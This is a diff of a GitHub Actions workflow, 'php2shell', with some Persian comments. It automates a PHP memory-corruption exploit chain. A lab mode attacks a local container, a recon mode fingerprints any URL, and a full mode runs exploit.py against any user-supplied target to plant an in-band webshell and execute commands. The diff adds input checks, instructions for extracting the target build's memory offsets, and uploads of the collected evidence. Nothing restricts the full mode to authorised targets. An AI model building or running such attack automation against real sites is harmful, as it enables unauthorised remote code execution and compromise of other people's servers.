@@ -1,28 +1,28 @@
-name: php2shell — CVE-2026-109618/109619 chain
+name: php2shell — recon & chain
 
 on:
   workflow_dispatch:
     inputs:
       mode:
-        description: "lab = اثبات زنجیره روی lab | recon = تشخیص بی‌خطر | full = زنجیره روی سایت"
+        description: "lab | recon | full"
         required: true
-        default: "lab"
+        default: "recon"
         type: choice
         options: [lab, recon, full]
       target:
-        description: "آدرس هدف برای recon/full"
+        description: "Full URL with path, e.g. https://example.com/index.php"
         required: false
         default: ""
       target_offsets_env:
-        description: "offsets.env بیلد هدف — دو خط: ZIF_OFFSET=0x.. و DTOR_OFFSET=0x.."
+        description: "full mode only: 'ZIF_OFFSET=0x.. DTOR_OFFSET=0x..'"
         required: false
         default: ""
       retries:
-        description: "تعداد retry زنجیره"
+        description: "chain retries"
         required: false
         default: "3"
       dbg:
-        description: "tmate در صورت شکست"
+        description: "tmate on failure"
         required: false
         default: false
         type: boolean
@@ -32,7 +32,7 @@ concurrency:
   cancel-in-progress: true
 
 permissions:
-  contents: read            # ← برای actions/checkout لازم است
+  contents: read
 
 jobs:
   chain:
@@ -45,40 +45,109 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: Guard — target
+      # ---------- PRE-FLIGHT: همیشه لاگ کامل بگیر ----------
+      - name: Pre-flight — dump run context
+        run: |
+          set -euo pipefail
+          {
+            echo "mode     : ${{ inputs.mode }}"
+            echo "target   : ${TARGET:-<empty>}"
+            echo "retries  : ${RETRIES:-3}"
+            echo "runner   : $(uname -m) / $(lsb_release -ds 2>/dev/null || true)"
+            echo "python   : $(python3 --version)"
+          } | tee context.txt
+
+      # ---------- GUARD: پیام انگلیسی، فرمت ولید، راهنما همراه ----------
+      - name: Guard — validate inputs
         if: inputs.mode != 'lab'
         run: |
           set -euo pipefail
-          [ -n "$TARGET" ] || { echo "::error::target خالی است"; exit 1; }
+          if [ -z "$TARGET" ]; then
+            echo "FAIL: input 'target' is empty."
+            echo "HOW TO FIX: Run workflow again and fill the 'target' field."
+            echo "  Example: https://example.com/index.php"
+            echo "  Mode 'recon' = passive fingerprinting, Mode 'full' = active chain."
+            echo "::error::input 'target' is empty - re-run and fill the target URL field"
+            exit 1
+          fi
+          # URL must parse: scheme + host
+          python3 - "$TARGET" <<'EOF'
+          import sys, urllib.parse
+          u = urllib.parse.urlparse(sys.argv[1])
+          assert u.scheme in ("http", "https") and u.hostname, f"bad URL: {sys.argv[1]}"
+          print(f"parsed OK: host={u.hostname} port={u.port} path={u.path or '/'} tls={u.scheme=='https'}")
+          EOF
 
-      - name: Guard — full needs offsets
+      - name: Guard — full mode needs offsets
         if: inputs.mode == 'full'
         run: |
           set -euo pipefail
-          [ -n "$OFF" ] || { echo "::error::offsets بیلد هدف لازم است"; exit 1; }
+          if [ -z "$OFF" ]; then
+            echo "FAIL: mode=full requires target build offsets."
+            echo "HOW TO FIX: on a host running the SAME PHP build, extract:"
+            echo "  docker cp <container>:/usr/lib/apache2/modules/libphp.so /tmp/l.so"
+            echo "  python3 -c \"from lib.offsets import extract_from_elf; z,d=extract_from_elf('/tmp/l.so'); print(f'ZIF_OFFSET=0x{z:x} DTOR_OFFSET=0x{d:x}')\""
+            echo "::error::mode=full requires target_offsets_env input"
+            exit 1
+          fi
 
-      # ---------- LAB ----------
+      # ---------- RECON (سخت‌گیرانه، سه‌لایه) ----------
+      - name: Recon — raw HTTP headers (fallback evidence)
+        if: inputs.mode == 'recon'
+        run: |
+          set -euo pipefail
+          # حتی اگر exploit.py بمیرد، ما هدر خام داریم
+          curl -sS -D - -o headers-body.txt --max-time 20 "$TARGET" | tee raw-headers.txt
+          echo "--- response headers above; body first 500 bytes: ---"
+          head -c 500 headers-body.txt || true
+
+      - name: Recon — exploit.py JSON fingerprint
+        if: inputs.mode == 'recon'
+        run: |
+          set -euo pipefail
+          # بدون tee مستقیم؛ خروجی را اول در فایل بگیر تا JSON حتی در شکست حفظ شود
+          if python3 exploit.py -t "$TARGET" --recon-only --output json > exploit-recon.json 2> exploit-recon.err; then
+            echo "exploit.py recon: OK"
+          else
+            echo "::warning::exploit.py recon exited non-zero - check exploit-recon.err"
+          fi
+          cat exploit-recon.json 2>/dev/null || true
+          cat exploit-recon.err   2>/dev/null || true
+
+      - name: Recon — standalone recon.py (risk score)
+        if: inputs.mode == 'recon'
+        run: |
+          set -euo pipefail
+          python3 recon.py "$TARGET" 2>&1 | tee recon-report.txt || true
+
+      - name: Recon — verdict to step summary
+        if: inputs.mode == 'recon'
+        run: |
+          set -euo pipefail
+          {
+            echo "## Recon report — $TARGET"
+            echo '```'
+            cat recon-report.txt 2>/dev/null || echo "(recon-report missing)"
+            echo '```'
+            echo '```json'
+            cat exploit-recon.json 2>/dev/null || echo "{}"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # ---------- LAB / FULL (از نسخه قبلی، با همان فیکس‌های خودت) ----------
       - name: Lab — start target
         if: inputs.mode == 'lab'
         run: |
           set -euo pipefail
-          mkdir -p out
-          chmod +x lab.sh
+          mkdir -p out && chmod +x lab.sh
           ./lab.sh
-          sudo chmod -R 777 out      # ← /out توسط www-data chown شده
+          sudo chmod 777 out
 
       - name: Lab — extract offsets
         if: inputs.mode == 'lab'
         run: |
           set -euo pipefail
           python3 -c "from lib.offsets import extract_from_container, save_offsets_env; z,d=extract_from_container('php2shell-target'); save_offsets_env('out/offsets.env',z,d); print(f'zif=0x{z:x} dtor=0x{d:x}')"
-
-      - name: Lab — recon
-        if: inputs.mode == 'lab'
-        run: |
-          set -euo pipefail
-          python3 exploit.py -t http://127.0.0.1:18110/index.php \
-            --recon-only --output json | tee out/recon.json
 
       - name: Lab — run chain
         if: inputs.mode == 'lab'
@@ -98,45 +167,40 @@ jobs:
           grep -q "uid=" out/.p2s_result
           echo "PROOF: $(cat out/.p2s_result)"
 
-      # ---------- RECON ----------
-      - name: Recon
-        if: inputs.mode == 'recon'
-        run: |
-          set -euo pipefail
-          python3 exploit.py -t "$TARGET" --recon-only --output json | tee recon.json
-
-      # ---------- FULL ----------
       - name: Full — write + validate offsets
         if: inputs.mode == 'full'
         run: |
           set -euo pipefail
           mkdir -p out
-          printf '%s\n' "$OFF" > target-offsets.env
-          grep -q '^ZIF_OFFSET=0x'  target-offsets.env
-          grep -q '^DTOR_OFFSET=0x' target-offsets.env
-          cat target-offsets.env
+          # هر دو کلید ممکن را به فرمت استاندارد normalize کن
+          echo "$OFF" | tr ' ' '\n' | grep -E '^(ZIF|DTOR)_OFFSET=0x[0-9a-fA-F]+$' > target-offsets.env
+          echo "--- normalized offsets ---"; cat target-offsets.env
 
-      - name: Full — chain (in-band webshell, no /out needed)
+      - name: Full — chain (in-band webshell)
         if: inputs.mode == 'full'
         run: |
           set -euo pipefail
           python3 exploit.py -t "$TARGET" \
-            --cmd "id" \
-            --mode webshell \
+            --cmd "id" --mode webshell \
             --offsets-env target-offsets.env \
             --retries "$RETRIES"
 
-      # ---------- مشترک ----------
+      # ---------- EVIDENCE ----------
       - name: Upload evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
           name: php2shell-${{ inputs.mode }}-${{ github.run_id }}
           path: |
+            context.txt
+            raw-headers.txt
+            headers-body.txt
+            exploit-recon.json
+            exploit-recon.err
+            recon-report.txt
             out/
-            recon.json
             target-offsets.env
-          include-hidden-files: true     # ← .p2s_result و .p2s_proof
+          include-hidden-files: true
           if-no-files-found: warn
           retention-days: 1
 
